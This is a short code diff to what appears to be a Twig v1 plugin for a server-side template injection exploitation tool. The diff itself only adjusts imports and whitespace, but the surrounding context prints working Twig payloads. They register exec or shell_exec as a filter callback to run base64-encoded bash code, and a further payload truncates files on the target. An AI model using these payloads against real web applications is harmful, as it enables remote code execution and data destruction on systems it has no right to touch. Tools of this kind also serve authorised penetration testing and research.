@@ -1,6 +1,6 @@
-from plugins.languages import php
-from core import bash
-from utils import rand
+from ..languages import php
+from ...core import bash
+from ...utils import rand
 
 
 class Twig_v1(php.Php):
@@ -61,7 +61,7 @@ class Twig_v1(php.Php):
                 'call': 'render',
                 'execute': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'")}}}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
-                'test_cmd_expected': rand.randstrings[2] 
+                'test_cmd_expected': rand.randstrings[2]
             },
             'execute_error': {
                 'execute': """{{{{_self.env.registerUndefinedFilterCallback("shell_exec")}}}}{{%set b=_self.env.getFilter("bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'")%}}""",
@@ -81,7 +81,7 @@ class Twig_v1(php.Php):
                 'truncate': """{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}{{{{_self.env.getFilter("echo -n >{path}")}}}}"""
             },
         })
-        
+
         self.set_contexts([
             # Text context, no closures
             {'level': 0},
